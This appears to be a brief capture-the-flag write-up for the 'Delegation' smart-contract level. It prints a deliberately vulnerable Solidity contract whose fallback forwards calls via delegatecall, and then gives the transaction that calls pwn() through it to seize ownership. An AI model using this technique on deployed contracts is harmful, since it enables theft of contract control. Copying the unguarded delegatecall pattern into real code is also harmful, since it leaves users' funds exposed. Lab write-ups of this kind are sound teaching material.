# Delegation

```solidity
contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

We see a fallback function we can invoke using *contractInstance.call(bytes4(sha3("functionName(inputType)"))*. You send 4 bytes of the sha3 which identifies the method you are calling.

Since it is a fallback function you dont need the *functionName*, just data. If the fallback function has *payable* you will need to send some ether also. So we will invoke the *fallback* function -> *delegatecall* function inside delegate -> *pwn()* public function.

Since delegatecall sends msg.data we should send *bytes4(sha3("pwn()"))* to the *fallback* function. 

Inside *pwn()* is *owner = msg.sender*. Since *Delegate* storage (slot 0) is *Delegation* storage(slot 0), we know the owner in Delegate point to the owner in Delegation.

```solidity
await sendTransaction({
  from: "0x1733d5adaccbe8057dba822ea74806361d181654",
  to: "0xe3895c413b0035512c029878d1ce4d8702d02320",
  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
});
```

I ripped this off the walkthrough since I'm too dumb to figure it out fully.